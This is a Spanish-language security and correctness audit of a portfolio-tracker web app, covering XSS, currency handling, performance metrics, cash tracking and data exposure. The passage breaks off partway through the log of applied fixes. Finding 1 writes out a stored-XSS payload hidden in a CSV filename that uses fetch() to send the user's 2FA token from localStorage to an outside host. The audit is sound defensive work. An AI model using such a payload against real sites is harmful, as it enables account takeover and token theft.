# Auditoría del Portfolio Tracker — 4 de septiembre de 2026

**Alcance:** la sección `#section-tracker` completa — vista de lista, dashboard de portafolio y sus
9 pestañas (Resumen, Desempeño, Transacciones, Proyección, Metas, Dividendos, Rebalanceo,
Correlación, What-If), más el camino de persistencia (`/api/account/portfolios`,
`/api/account/bootstrap`), el de precios (`/api/price`, `/api/prices`, `/api/chart`,
`/api/dividends`) y el enlace público (`/api/public/portfolio/{token}` + `p.html`).

**Método:** lectura de código (main.js ~5.500–14.200, main.html 227–1.768, persistence.py,
api.py, p.html). **No ejecuté la app**: cada hallazgo está anclado a archivo y línea y es
verificable leyendo esa línea. Donde infiero un efecto en pantalla sin haberlo visto, lo digo.

**Veredicto.** El tracker está bien construido en lo que más duele normalmente: hay control de
concurrencia con versión (409), el P/L realizado se reconstruye de las transacciones, hay
idempotencia en dividendos, hay freno de escritura si el bootstrap falló, el precio ya no sale
del cierre diario y el logo ya no filtra la cartera a un tercero. Los problemas que quedan no son
de arquitectura: son **de aritmética financiera y de saneado de entradas**. Hay cinco que
contradicen la promesa de "máxima fiabilidad" y que un inversionista puede detectar con su propia
cartera en menos de una sesión.

---

## Estado — 4 de septiembre de 2026, tarde

**Los cinco P0 y los nueve P1 (6–14) están aplicados, verificados y desplegados.**
El detalle de cada corrección va al final, en «Qué se aplicó». Los P2–P3 siguen
abiertos tal como están descritos aquí.

---

## Índice priorizado

| # | Prioridad | Hallazgo | Dónde |
|---|---|---|---|
| 1 | **P0** | XSS almacenado por nombre de portafolio y ticker (vector: nombre de archivo CSV) | main.js:8200, 8834, 8753; persistence.py:1185 |
| 2 | **P0** | La conversión de divisa se omite en silencio y suma MXN a USD 1:1 | 54 sitios `convertAmount(...) ?? raw` |
| 3 | **P0** | Todas las métricas de Desempeño usan pesos fijos y no miran la fecha de compra | main.js:13700, 13711 |
| 4 | **P0** | Cero manejo de splits; series históricas sin ajustar | main.js:12514 y 7 llamadas |
| 5 | **P0** | El efectivo tiene fugas: compras mayores al saldo desaparecen | main.js:12029, 7712 |
| 6 | **P1** | Dividendos calculados con la cantidad de HOY y perdidos al comprar más | main.js:9309, 12006 |
| 7 | **P1** | "Comprar más" reescribe fecha, IVA y tasa de toda la posición | main.js:12002–12006 |
| 8 | **P1** | El IVA entra al costo de la posición pero no a la transacción: dos bases de costo | main.js:6004, 9248 |
| 9 | **P1** | Los dividendos suben "Valor actual" y no suben "Retorno" | main.js:7961, 8558 |
| 10 | **P1** | Sharpe/Sortino/Alfa usan TIIE 28 (MXN) para portafolios en cualquier divisa | main.js:13817, api.py:2154 |
| 11 | **P1** | Cambiar la divisa del portafolio redenomina el efectivo sin convertirlo | main.js:11766 |
| 12 | **P1** | Un ticker nuevo trunca el histórico de todo el portafolio (intersección de fechas) | main.js:13683 |
| 13 | **P1** | El enlace público publica el patrimonio; el modal promete lo contrario | main.html:340, p.html:138 |
| 14 | **P1** | El límite de posiciones del plan no se valida en el cliente | main.js:11985 |
| 15 | **P2** | Tres esquemas de color distintos para el mismo ticker | main.js:8842 vs 10760 vs 9374 |
| 16 | **P2** | Caché de precios de 1 h, compartida entre usuarios y sin limpiar al salir | main.js:5531, 7794 |
| 17 | **P2** | Ticker libre sin validar y sin deduplicar | main.js:11960, 6161 |
| 18 | **P2** | XIRR mezcla divisas y descarta compras cuando hay depósitos | main.js:8437 |
| 19 | **P2** | "vs Bench." usa un costo distinto al de la columna "Retorno" | main.js:8999 |
| 20 | **P2** | Formularios que fallan en silencio; `confirm()` nativo | main.js:11966, 12100, 7776 |
| 21 | **P2** | El refresco de 5 min reconstruye la tabla bajo el dedo del usuario | main.js:8138 |
| 22 | **P2** | Accesibilidad: borrar portafolio no es alcanzable por teclado; sin `aria-live` | main.js:8201; main.html |
| 23 | **P2** | Un campo faltante en una posición tumba el dashboard entero | main.js:8900 |
| 24 | **P3** | CSV: sin límite de tamaño, sin previsualización, inyección de fórmulas al exportar | main.js:6124, 6023 |
| 25 | **P3** | Alertas: sólo precio puntual cada 15 min | api.py:957 |
| 26 | **P3** | `/api/search` interpola el término sin codificar en la URL de Yahoo | api.py:501 |
| 27 | — | Implementaciones nuevas propuestas | § Oportunidades |

---

# P0 — Rompen la confianza en el dato

## 1. XSS almacenado por nombre de portafolio y ticker

**Qué pasa.** El tracker construye HTML por concatenación y no escapa dos campos que el usuario
controla por completo:

- `main.js:8200` → `<h3>${p.name}</h3>` y `main.js:8201` → `data-delete-name="${p.name}"`
  (el segundo permite salir del atributo con una comilla).
- `main.js:8753` y `main.js:8893` → `${pos.ticker}` sin escapar en la tabla de resumen y en la de
  posiciones (el resto de los usos del ticker van dentro de `data-*`, igual de inyectables).
- `main.js:8834` → `Sin posiciones que coincidan con "${posSearch}"` inyecta el texto del buscador.

El backend no ayuda: `persistence.py:1185` declara `portfolios: list[dict[str, Any]]`. No hay
esquema, ni tipos, ni longitudes, ni saneado. Lo único que valida el `PUT /api/account/portfolios`
es que el JSON pese menos de 5 MB. Todo lo que el cliente mande se guarda tal cual y **vuelve en
cada carga**, así que la inyección es persistente, no reflejada.

**Por qué es explotable de verdad.** El vector no exige que la víctima se ataque a sí misma:
`main.js:6186` bautiza el portafolio importado con `${baseName} (importado)`, donde `baseName` es
el **nombre del archivo CSV**. Basta con que alguien reciba —por correo, por Drive, por el chat de
un grupo de inversión— un archivo llamado
`Cartera</h3><img src=x onerror=fetch('https://…?t='+localStorage.getItem('bp-2fa-token'))>.csv`
y lo suelte en el área de importación, que además acepta *drag & drop* (main.js:11594).

**Impacto.** El CSP de Hosting incluye `script-src 'self' 'unsafe-inline'` (firebase.json), así que
el script inyectado corre sin fricción. En `localStorage` viven `bp-2fa-token` y el estado de
sesión de Firebase: la inyección permite exfiltrar el token de 2FA y actuar contra la API como el
usuario. Es toma de cuenta, no un `alert(1)`.

**Corrección.**
1. Escapar en el render: ya existe `_divEsc` (main.js:9368). Aplicarlo a `p.name`,
   `p.description`, `pos.ticker`, `pos.note` y `posSearch` en todos los `innerHTML` del tracker.
2. Validar en el servidor con un modelo Pydantic real (ticker `^[A-Z0-9.\-=^]{1,20}$`, nombres
   ≤ 80 caracteres, cantidades numéricas y finitas, tope de posiciones y transacciones por
   portafolio). Hoy `p.html` ya sanea con `_clean()` (persistence.py:1202) — el mismo criterio
   debe aplicarse **al guardar**, no sólo al publicar.
3. Quitar `'unsafe-inline'` de `script-src` cuando el trabajo de inline handlers lo permita.

---

## 2. La conversión de divisa se omite en silencio

**Qué pasa.** `convertAmount()` (main.js:7909) devuelve `null` cuando el par FX no está en la
caché de precios. **Los 54 llamadores** hacen lo mismo:

```js
totalCurrentValue += convertAmount(price * qty, posCur, currency) ?? (price * qty);
```

Es decir: si el tipo de cambio no llegó, se suma la cantidad **sin convertir**. Un portafolio en
USD con `NAFTRAC.MX` o `WALMEX.MX` suma pesos como si fueran dólares: el valor de esa posición
aparece inflado ~18×. Ocurre en los sitios que definen las cifras principales:

- `computePortfolioSnapshot` (8010–8018) → las tarjetas de la lista y la barra consolidada.
- `_doRenderDashboard` (8547–8551) → Valor actual, Retorno, Cambio de hoy.
- `calcPortfolioTotals` (8030) → Capital invertido, comisiones, IVA.
- `reconstructRealizedPnL` (7985), `txCashEffect` (7579), `buildConsolidatedPortfolio` (5760).

**Cuándo se dispara.** El FX se pide con `fetchExchangeRates` (7923) usando pseudo-tickers
`MXNUSD=X` contra el mismo endpoint de precios. Basta con que Yahoo falle, que el símbolo no
resuelva, que el usuario abra el tracker con la red intermitente, o que la caché caduque en un
momento en que la petición falle: **no hay ningún aviso en pantalla**, la cifra simplemente queda
mal. `formatDashExchangeRate` sí sabe decir "Tipo de cambio pendiente" (7918), pero sólo para la
equivalencia informativa opcional, no para el valor real.

**Corrección.** Propagar el `null`: cuando falte una conversión, la cifra agregada debe mostrarse
como `—` con una nota ("no se pudo obtener el tipo de cambio de MXN→USD"), nunca como una suma
mixta. Es preferible una celda vacía honesta a un patrimonio inventado.

---

## 3. Las métricas de Desempeño no miran la fecha de compra

**Qué pasa.** La serie de retornos diarios que alimenta **toda** la pestaña se construye así
(main.js:13705–13719):

```js
const isActive = !pos.sellDate || d1 <= pos.sellDate;   // ← nunca compara con purchaseDate
...
portReturn += pos._weight * (c1 - c0) / c0;
```

Dos defectos encadenados:

1. **No se comprueba la fecha de compra.** Una acción comprada la semana pasada aporta su retorno
   de los últimos 12 meses al desempeño anual del portafolio. Si compraste NVDA después de una
   subida, tu portafolio "rindió" esa subida que nunca capturaste.
2. **Los pesos son constantes** (`pos._weight`, 13700): salen del costo **actual** de cada
   posición y se aplican a todos los días del periodo. No hay deriva por precio ni cambio por
   aportaciones. Y cuando una posición se vende, su peso simplemente desaparece: los pesos
   restantes no se renormalizan, así que el retorno del portafolio queda amortiguado hacia cero
   después de cada venta.

**Qué contamina.** Todo lo que se deriva de `dailyPortfolioReturns`: TWR, Sharpe, Volatilidad,
VaR, Beta, Máximo drawdown, Sortino, Calmar, Alfa, Information Ratio, Captura alcista/bajista, el
Tracking error y la gráfica acumulada contra el benchmark. El rótulo dice "TWR (Time-Weighted
Return)" y no es un TWR: es un índice de pesos fijos.

**Corrección.** Construir primero la **serie diaria de valor real** —cantidad efectivamente
tenida en cada fecha, reconstruida de las transacciones, por precio de cierre de esa fecha— y de
ahí derivar los retornos, neutralizando los flujos de caja del día (Modified Dietz o TWR por
subperiodos). Ya existe media pieza para eso: `buildAllPositionHistory` (13162) sabe reconstruir
lotes con FIFO; le falta emitir la cantidad por fecha en lugar de una cantidad única.

---

## 4. Cero manejo de splits, y series históricas sin ajustar

**Qué pasa.** La palabra "split" no aparece en el tracker. No hay lectura de eventos corporativos,
no hay reconciliación de cantidad, no hay aviso.

Consecuencia directa: tras un split 4:1, la posición guardada sigue con la cantidad y el precio
promedio pre-split, mientras el precio de mercado ya es post-split. **La posición pierde 75 % de
su valor en pantalla y no vuelve nunca**, y arrastra al Valor actual, al Retorno, al "vs Bench." y
al peso en la composición. El usuario tiene que darse cuenta solo y corregir a mano.

Agravante: `fetchHistoricalCloses` (12514) sabe usar `adjclose` pero sólo se le pide con
`{ adjusted: true }` en dos llamadas (14670 y 14821, el motor de Monte Carlo). Las otras siete
—reporte histórico (6652), "vs Bench." (8979), retorno por periodo (9057), correlación (10033),
What-If (10266), gráfica de valor (13326), pestaña Desempeño (13598)— usan cierres **sin
ajustar**. Eso significa que:

- Un split aparece como un desplome en cada gráfica y envenena la correlación, la beta y el
  drawdown.
- Los dividendos no cuentan en ninguna comparación contra el benchmark: se compara el retorno de
  precio de la cartera contra el retorno de precio del índice, cuando el estándar es retorno total.

**Corrección.** (a) Pedir `{ adjusted: true }` en las siete llamadas restantes. (b) Exponer los
eventos de split desde el backend (Yahoo ya los devuelve: `events=div,splits`, ya está en la URL
de api.py:2423) y ofrecer al usuario un aviso accionable: "AAPL hizo un split 4:1 el 2026-08-31 —
¿ajustamos tu posición de 25 a 100 acciones?". Nunca ajustar en silencio.

---

## 5. El efectivo tiene fugas

**Qué pasa.** `cashBalance` es un acumulador mutable, no una cifra derivada, y tres caminos lo
recortan:

- **Compra** (main.js:12029):
  ```js
  if (currentCash > 0) portfolio.cashBalance = Math.max(0, currentCash - purchaseCostInPortfolioCur);
  ```
  Si compras por más de lo que hay en caja, el exceso se pierde: no queda saldo negativo y **no se
  registra ninguna aportación**, aunque el comentario del código diga "remainder is new injection".
  Si el saldo era 0, la compra no toca la caja en absoluto.
- **Edición o borrado de transacción** (`applyTxMutation`, 7712): el mismo `Math.max(0, …)`.
  Borrar una compra grande debería devolver su costo a la caja; si la caja está baja, no lo hace.
- **Venta** (12088) y **dividendo** (9333): siempre suman, sin tope.

El resultado es un saldo que **no se puede reconstruir desde las transacciones** y que deriva en
una sola dirección. Y ese saldo entra directo en la cifra más visible de la app:
`displayCurrentValue = totalCurrentValue + cashBalance` (8558).

**Corrección.** Derivar el efectivo de las transacciones (`Σ txCashEffect`), o —si se quiere
conservar el campo por rendimiento— permitir saldo negativo y mostrarlo como "descubierto", más un
botón de "conciliar efectivo" que recalcule desde el historial y muestre la diferencia. La caja de
un inversionista tiene que cuadrar o decir por qué no cuadra.

---

# P1 — Cifras equivocadas o promesas incumplidas

## 6. Dividendos con la cantidad de hoy, y perdidos al comprar más

`syncDividends` (main.js:9268) recorre el historial de dividendos del ticker y, para cada pago,
suma la cantidad de las posiciones cuya `purchaseDate <= fecha ex`:

```js
if (pos.purchaseDate <= div.date) { qtyAtExDate += pos.quantity || 0; ... }   // 9307-9310
```

`pos.quantity` es la cantidad **actual**, no la que se tenía en la fecha ex. Si compraste 10
acciones en enero y 90 en junio, el dividendo de marzo se paga sobre 100. Y como "Comprar más"
sobrescribe `purchaseDate` con la fecha del último lote (hallazgo 7), en la práctica pasa lo
contrario: **todos los dividendos anteriores a tu última compra desaparecen** del historial y del
saldo. Lo mismo aplica al registro manual: `openDividendModal` y su submit (11705) usan
`pos.quantity` aunque el usuario ponga una fecha de pago vieja.

Además `syncDividends` **muta y guarda el portafolio solo**, en cada render del dashboard
(renderPortfolioDashboard:8386): es una escritura no solicitada por el usuario y —según el
incidente de pérdida de posiciones de agosto— exactamente el disparador que conviene vigilar. Hoy
está protegido por `baseVersion`, pero sigue provocando conflictos 409 espurios cuando hay dos
pestañas abiertas, y sigue acreditando efectivo a quien reinvierte dividendos automáticamente
(DRIP) o los cobra en otra cuenta, sin opción de desactivarlo.

**Corrección.** Calcular la cantidad tenida en la fecha ex a partir de las transacciones (la misma
función que hace falta para el hallazgo 3); añadir un interruptor "sincronizar dividendos
automáticamente" en Ajustes del portafolio; ejecutar la sincronización una vez por sesión, no en
cada render.

## 7. "Comprar más" reescribe el historial de la posición

En el `submit` de `addPositionForm`, cuando ya existe una posición con el mismo ticker
(main.js:11985), se hace un promedio ponderado correcto de precio y comisión, pero después:

```js
existingPos.applyIva = applyIva;      // 12004
existingPos.ivaRate  = ivaRate;       // 12005
existingPos.purchaseDate = purchaseDate;  // 12006
```

Tres efectos retroactivos sobre acciones que ya tenías:
- Comprar más **sin** marcar IVA borra el IVA del costo base de toda la posición (y al revés, lo
  agrega a acciones que nunca lo pagaron).
- La fecha de compra salta al último lote: el "vs Bench." (que compara desde `purchaseDate`,
  8996) y el "Retorno YTD" (que recorta en `purchaseDate`, 9074) pasan a medir desde ayer.
- Si el campo de fecha viene vacío, `purchaseDate` queda en `""` y la fecha desaparece.

Y el emparejamiento es **sólo por ticker**, ignorando la divisa: si la posición existente está en
EUR y el nuevo lote se captura en USD, los precios se promedian 1:1 y la divisa del lote nuevo se
descarta.

## 8. Dos bases de costo distintas para la misma posición

- La **posición** calcula su costo con IVA: `calcPositionTotals` (7875) →
  `total = invertido + comisión + IVA`.
- La **transacción** que la respalda no: `recordTransaction` (6004) →
  `net = bruto ± comisión`, sin IVA.

Como el P/L realizado se reconstruye de las transacciones (`reconstructRealizedPnL`, 7961) y el
P/L no realizado sale de las posiciones, **la misma pantalla mezcla dos bases de costo**. En la
venta el desfase es peor: `calcWithdrawNet` (9248) descuenta el IVA del importe que se abona a la
caja, pero la transacción se graba sin él, así que la ganancia realizada queda **sobreestimada
exactamente en el IVA de la comisión de venta** y el efectivo no coincide con el historial.

De paso: el `submit` de venta escribe `portfolio.realizedPnL` (12093) — un campo que se persiste y
que ningún render lee, porque todo usa `reconstructRealizedPnL`. Es estado muerto que puede
contradecir al vivo si algo llega a leerlo.

## 9. Los dividendos no aparecen en el Retorno

`reconstructRealizedPnL` filtra `COMPRA | VENTA` (7965): los `DIVIDENDO` no entran. Pero sí
aumentan `cashBalance` (9333), que sí entra en el Valor actual (8558). Resultado:

> cobras un dividendo → **Valor actual sube**, **Retorno no se mueve**.

Para una cartera de dividendos —justo el perfil que más usa un tracker— el KPI principal
subestima el desempeño de forma sistemática y creciente. Además `Capital invertido + Retorno` no
reconcilia con `Valor actual` y no hay ninguna nota que lo explique.

**Corrección.** Incluir los dividendos en el retorno (como componente realizado, con su propia
línea "Ingresos por dividendos") y añadir una fila de conciliación bajo los KPIs.

## 10. La tasa libre de riesgo es siempre la TIIE mexicana

`calcMetrics` (12564) y las métricas extendidas (13817) usan `perfRfr.rate`, que viene de
`/api/risk-free-rate` (api.py:2154): **TIIE 28 de Banxico**, ~9–11 %, con *fallback* fijo de 9 %.
Se aplica igual a un portafolio en USD, EUR o GBP.

Efecto: un portafolio en dólares que rinde 12 % con 15 % de volatilidad muestra un Sharpe ≈ 0,2
cuando contra la tasa correcta (~4–5 % en USD) sería ≈ 0,5. Sortino y Alfa arrastran el mismo
error. La etiqueta dice "TIIE 28 (Banxico)", así que está declarado — pero declarar una cifra
equivocada no la hace correcta.

**Corrección.** Elegir la tasa por divisa del portafolio (TIIE para MXN, T-Bill 3M para USD,
€STR/Bund para EUR, SONIA para GBP), con la actual como respaldo y la etiqueta reflejando cuál se
usó.

## 11. Cambiar la divisa del portafolio redenomina el efectivo

`editPortfolioForm` (main.js:11766) asigna `portfolio.currency` y guarda. Las posiciones se
reconvierten al vuelo porque llevan su propia divisa, pero `cashBalance` es un número desnudo:
pasar el portafolio de USD a MXN convierte 10.000 dólares en 10.000 pesos, sin conversión y sin
aviso. Las transacciones históricas guardadas con la divisa antigua también quedan mezcladas en
`txCashEffect`.

**Corrección.** Al cambiar la divisa, convertir el efectivo al tipo de cambio del momento (o pedir
confirmación explícita: "¿convertir 10.000 USD a 184.300 MXN?").

## 12. Un ticker nuevo trunca el histórico de todo el portafolio

`loadPerformanceTab` (13683) toma la **intersección** de fechas de todos los tickers con datos:

```js
let commonDates = [...dateSets[0]].filter((d) => dateSets.every((s) => s.has(d))).sort();
```

Una IPO reciente, un ETF poco líquido o una cripto que cotiza fines de semana recortan la ventana
de análisis de todo el portafolio al mínimo común. Con un activo listado hace un mes, el
"Desempeño 1 año" se calcula sobre un mes — y no lo dice. Es la misma clase de error que ya se
corrigió en el muestreo de Monte Carlo; aquí sigue vivo, y también en la correlación (10033), que
además calcula Pearson sobre pares no alineados.

**Corrección.** Unión de fechas con relleno hacia adelante por activo, y aviso explícito cuando un
activo tiene menos historia que la ventana pedida.

## 13. El enlace público publica el patrimonio

El modal de compartir (main.html:340) dice:

> "Cualquiera con este enlace podrá ver la composición de tu portafolio en modo solo lectura. No se
> muestran datos de tu cuenta."

Pero `/api/public/portfolio/{token}` devuelve `quantity` y `avgPrice` de cada posición
(persistence.py:1725–1727) y `p.html:138` pinta un KPI **"Valor estimado"** con el total en
dinero. Quien reciba el enlace sabe cuánto dinero tienes y en qué, para siempre, hasta que se
revoque. La copia del modal no describe lo que hace el producto.

**Corrección.** O bien publicar sólo porcentajes (quitar `quantity`/`avgPrice` de la respuesta y
el KPI de valor), o bien ofrecer el interruptor "incluir montos" apagado por omisión y corregir la
copia. Lo que no puede quedarse es la contradicción.

## 14. El límite de posiciones del plan no se valida en el cliente

El frontend comprueba `maxPortfolios` al crear (11626) y al importar (6125), pero **nunca**
`maxPositions`. El servidor sí (persistence.py:1268). Así que un usuario Explorer (10 posiciones)
agrega la número 11, la ve aparecer en la tabla, y entonces el guardado devuelve 403; el
manejador de errores permanentes (5945) recarga desde el servidor y la posición **desaparece**,
con un toast genérico. Lo mismo con una importación CSV de 200 filas.

**Corrección.** Validar antes de mutar y mostrar el `showPlanToast` de mejora de plan, igual que
con los portafolios. En la importación, además, avisar antes: "tu CSV tiene 200 posiciones, tu
plan permite 10".

---

# P2 — Inconsistencias, robustez y experiencia

## 15. Tres esquemas de color para el mismo ticker

- Tabla de posiciones: `CHART_COLORS[i % n]` por **índice de fila ya ordenada/filtrada**
  (main.js:8842) → el color de AAPL cambia si ordenas por valor.
- Dona de composición: color por **rango de valor**, la mayor posición se lleva el cobalto
  (`_compositionEntries`, 10760).
- Pestaña Dividendos: color por **orden de aparición** (`_divColorFor`, 9374).

El color se usa como identificador del emisor —la propia documentación del código lo dice— y sin
embargo no coincide entre las tres láminas de la misma pantalla.

**Corrección.** Una sola función `colorForTicker(ticker)` determinista (hash del símbolo o rango
global estable), usada por las tres.

## 16. Precios de hasta una hora, compartidos entre usuarios

- `PRICE_CACHE_TTL = 60 * 60 * 1000` (5531). La vista de lista (`loadListViewData`, 8306) no tiene
  temporizador de refresco: las tarjetas pueden mostrar precios de hace una hora **sin ningún
  indicador de frescura** (el punto de frescura sólo existe en la tabla de posiciones, 8898).
- `PRICE_CACHE_KEY = "blackportfolio-price-cache-v2"` (5528) **no lleva el uid**, a diferencia de
  `getTrackerKey()` (5530). En un equipo compartido, la caché del usuario anterior sobrevive al
  cierre de sesión (`auth.js` sólo borra el token 2FA, el email y la última actividad) y revela
  qué tickers seguía.

**Corrección.** TTL corto (60–120 s) para lo visible, namespacing por uid, limpieza en el logout y
sello de frescura en las tarjetas.

## 17. Ticker libre, sin validar y sin deduplicar

`posTickerInput` acepta cualquier texto (11960: `.trim().toUpperCase()`), igual que el CSV (6161).
Un ticker inexistente crea una posición fantasma que nunca tendrá precio: queda excluida del valor
y del retorno (con la nota de 8585, que es lo correcto) pero sí cuenta en "Posiciones" y en el
costo invertido.

Peor: **nada impide dos posiciones con el mismo ticker** en un portafolio (el CSV las crea si el
archivo trae dos filas del mismo activo). A partir de ahí, `renderPositionBenchmarkDeltas` (9002),
`renderPositionsReturnPeriod` (9078) y `rebuildOpenPositionForTicker` (7677) usan
`find(p => p.ticker === ticker)` y sólo ven la primera: las celdas de la segunda fila muestran los
números de la primera, y editar una transacción colapsa una posición y deja la otra intacta.

**Corrección.** Verificar el símbolo contra `/api/search` antes de aceptar (o exigir selección de
la lista) y fusionar duplicados en la importación.

## 18. XIRR mezcla divisas y descarta compras

`buildXirrFlows` (8437) usa `tx.net` **sin convertir** y lo mezcla con `currentValue`, que está en
la divisa del portafolio. Además, si el portafolio tiene algún `DEPOSITO`/`RETIRO`, ignora todas
las compras y ventas — correcto sólo si *todo* el capital entró por depósitos; si el usuario
registró un depósito una vez y el resto de las compras vinieron de fuera, la TIR sale de un
conjunto de flujos incompleto. `calcXirr` (8420) tampoco tiene respaldo por bisección: cuando
Newton-Raphson no converge en 100 iteraciones muestra `—` sin explicar por qué.

## 19. "vs Bench." usa un costo distinto al de la columna vecina

En la misma fila:
- "Retorno" compara contra `calcPositionTotals(pos).total` — con comisión e IVA (8862).
- "vs Bench." compara contra `pos.avgPrice` — sin comisión ni IVA (8999).

Dos rentabilidades distintas del mismo activo, contiguas. Y la comparación no normaliza divisa: una
posición en `.MX` se compara en pesos contra un `^GSPC` en dólares.

## 20. Formularios que fallan en silencio

- Alta de posición: `if (!ticker || avgPrice <= 0 || quantity <= 0) return;` (11966) — el botón no
  hace nada y no hay mensaje.
- Venta: `if (sellPrice <= 0 || qty <= 0) return;` y `if (!pos || qty > pos.quantity) return;`
  (12100–12105) — vender más de lo que tienes no produce ningún aviso.
- Borrar transacción usa `confirm()` nativo (7776), rompiendo el lenguaje visual de la app y sin
  posibilidad de deshacer (a diferencia del borrado de posición, que sí tiene "Deshacer", 9138).

## 21. El refresco automático reconstruye la tabla bajo el dedo

`_dashRefreshTimer` (8138) cada 5 minutos invalida la caché y llama a `renderPortfolioDashboard`,
que reconstruye `positionsTableBody.innerHTML` por completo: se cierran las filas de lotes
expandidas, se cierra el menú de acciones abierto y se pierde el foco. Además el temporizador
**no se detiene al salir de la sección** (sólo en `showTrackerListView`/`showTrackerDashView`) ni
al ocultar la pestaña del navegador: un tracker abierto en segundo plano sigue pidiendo precios
indefinidamente — consumo innecesario de Railway y de la cuota de Yahoo.

**Corrección.** Actualizar celdas en sitio en vez de reconstruir el `innerHTML`; pausar con
`document.visibilityState`; limpiar el intervalo al cambiar de sección.

## 22. Accesibilidad

- El botón de borrar portafolio es un `<span role="button" tabindex="0">` con **sólo** listener de
  `click` (8201, 8236): es alcanzable con Tab pero **no se puede activar con Enter o Espacio**.
- En ~1.540 líneas de marcado del tracker hay **2** `aria-live`, ninguna en `dashPriceStatus`, en
  los KPIs que cambian solos, ni en los toasts: quien usa lector de pantalla no se entera de que
  los precios se actualizaron ni de que un guardado falló.
- `openModal`/`closeModal` (11300) sólo alternan una clase: sin trampa de foco, sin devolver el
  foco al disparador, sin `Escape` uniforme.

## 23. Un campo faltante tumba el dashboard entero

`renderPositionsTable` hace `pos.quantity.toFixed(5)` (8900) y `openDividendModal`
`pos.quantity.toFixed(5)` (9203). Como el backend acepta cualquier JSON (hallazgo 1), una posición
sin `quantity` —o con `quantity` como cadena— lanza `TypeError` y **deja el dashboard en blanco**
sin mensaje. No hay `try/catch` ni frontera de error alrededor del render.

---

# P3 — Higiene y oportunidades cercanas

## 24. Importación y exportación CSV

- Sin límite de tamaño: `reader.readAsText(file)` (6205) sobre un archivo de cientos de MB congela
  la pestaña.
- Sin previsualización ni mapeo de columnas: la heurística de alias (6141–6148) es generosa
  —`"amount"` y `"saldo"` cuentan como cantidad— y una columna mal adivinada crea posiciones
  incorrectas sin que el usuario vea nada antes de confirmar.
- La divisa del portafolio importado es la de la **primera fila válida** (6193).
- **Inyección de fórmulas** en la exportación (6023, 6056): los valores se entrecomillan, lo que
  no impide que Excel interprete `=…`, `+…`, `-…` o `@…` al abrir el CSV. Los tickers y nombres son
  texto del usuario y el CSV se comparte con contadores y asesores.

## 25. Alertas de precio

`_evaluate_alerts_once` (api.py:957) compara el **precio puntual** cada 15 minutos
(`ALERT_INTERVAL_MINUTES`). Un toque intradía del umbral entre dos evaluaciones no dispara nada, y
el hilo vive dentro del proceso web: si el servicio duerme, no hay alertas y el usuario no se
entera de que no las hubo.

**Corrección.** Evaluar contra el máximo/mínimo del intervalo (`/api/chart` a 5 min ya lo tiene) y
registrar la última evaluación exitosa para poder mostrar "última revisión: hace X".

## 26. `/api/search` interpola el término sin codificar

```python
url = f"https://query1.finance.yahoo.com/v1/finance/search?q={q}&quotesCount=8&newsCount=0"  # api.py:501
```

`q` llega crudo desde el cliente: un `&` o un `#` en la consulta cambia los parámetros de la
petición saliente. No es SSRF (el host es fijo), pero es contrabando de parámetros y basta un
`quote_plus(q)` para cerrarlo.

---

# Oportunidades — implementaciones que faltan

Ordenadas por lo que más aumenta la confiabilidad percibida:

1. **Lotes reales.** Hoy una posición es un promedio ponderado; no existe el concepto de lote con
   su propia fecha y costo. Sin lotes no hay FIFO/LIFO/coste específico, no hay P/L de corto vs
   largo plazo, y los hallazgos 3, 6 y 7 no tienen solución limpia. Es el cambio estructural que
   desbloquea el resto.
2. **Acciones corporativas** (splits, spin-offs, cambios de símbolo, fusiones) con revisión del
   usuario. Ver hallazgo 4.
3. **Aportaciones y retiros de efectivo explícitos** en la interfaz. Los tipos `DEPOSITO`/`RETIRO`
   ya existen en el modelo (7581, 7761) y en el XIRR, pero **no hay ningún botón que los cree**:
   sólo se pueden obtener editando una transacción existente. Es la pieza que falta para que la
   caja cuadre y para que la TIR sea real.
4. **Panel de conciliación.** Una vista que muestre "Capital invertido + Retorno + Aportes −
   Retiros = Valor actual" con la diferencia explicada, y que señale cada posición sin precio, sin
   FX o con historia insuficiente. Es la forma más directa de convertir los hallazgos 2, 5 y 9 en
   algo visible en lugar de silencioso.
5. **Impuestos y costo fiscal**: retención sobre dividendos, ganancia de corto/largo plazo,
   informe anual exportable. Es lo que un inversionista mexicano necesita en abril.
6. **Registro de auditoría del portafolio**: quién cambió qué y cuándo, con posibilidad de
   revertir. Ya existe `SecurityActivity` con eventos `portfolio_updated` (persistence.py:1301);
   falta exponerlo y guardar el diff.
7. **Modo sin conexión honesto.** Si el bootstrap falla, `savePortfolios` (5982) rechaza todo con
   un toast, pero la pantalla sigue mostrando el respaldo local como si fuera el estado real.
   Falta una banda persistente "sin conexión con el servidor — solo lectura".
8. **Precio manual / activos no cotizados** (bienes raíces, capital privado, cetes). Hoy todo lo
   que no resuelve en Yahoo es una posición fantasma.

---

## Lo que revisé y quedó limpio

Vale la pena registrarlo para no re-auditarlo: el control de concurrencia por versión
(persistence.py:1240–1258) es correcto y falla cerrado; `savePortfolios` se niega a escribir si el
bootstrap no cargó (5987); el portafolio sintético "Todos" nunca se persiste (5984); el flujo de
409 recarga en vez de reintentar (5928); `p.html` y su endpoint sanean en ambos lados
(persistence.py:1202, p.html:77); el logo se sirve desde la API propia y ya no filtra la cartera
(8777); la cotización usa `fulldayPrice` con caché de 45 s y ya no devuelve el cierre de ayer
(api.py:766); `/api/prices` topa a 60 símbolos por petición (api.py:866).

## Lo que no revisé

Las pestañas Proyección (Monte Carlo), Metas y Rebalanceo sólo se revisaron en su interfaz con el
resto del tracker, no en su motor —el de Monte Carlo ya tiene auditoría propia reciente—. Tampoco
ejecuté la app ni verifiqué el comportamiento en móvil con datos reales.


---

# Qué se aplicó (4 de septiembre de 2026)

Los cinco P0. Ninguno cambia datos ya guardados sin que el usuario lo pida, y
ninguno rechaza un portafolio existente.

**1. XSS.** Dos capas: `escHtml()` al pintar —tarjetas, tabla de posiciones,
resumen, transacciones, operaciones cerradas, lista de seguimiento, leyenda de la
dona, mapa de calor, atribución, riesgo y rebalanceo— y `sanitizePortfoliosInPlace()`
al leer del servidor y al guardar, que quita `<` y `>` de nombre, descripción,
ticker, nota y tipo. Sólo esos dos caracteres: las comillas y los acentos
sobreviven, y de las comillas se encarga el escape. En el backend,
`sanitize_portfolios()` hace lo mismo antes de calcular el checksum (si se firmara
el payload crudo, el control de concurrencia devolvería 409 solo). Se eligió sanear
y dejar pasar en vez de validar con un esquema estricto: un esquema habría dejado
sin poder guardar a cualquiera cuyo snapshot ya almacenado no lo cumpliera. De
paso, los botones de editar/borrar transacción pasaron de `onclick` con el id
interpolado a delegación por `data-`. Cinco pruebas nuevas en
`tests/test_portfolio_sanitize.py`.

**2. Divisas.** La corrección no fue parchar los 54 `?? cantidadSinConvertir`, sino
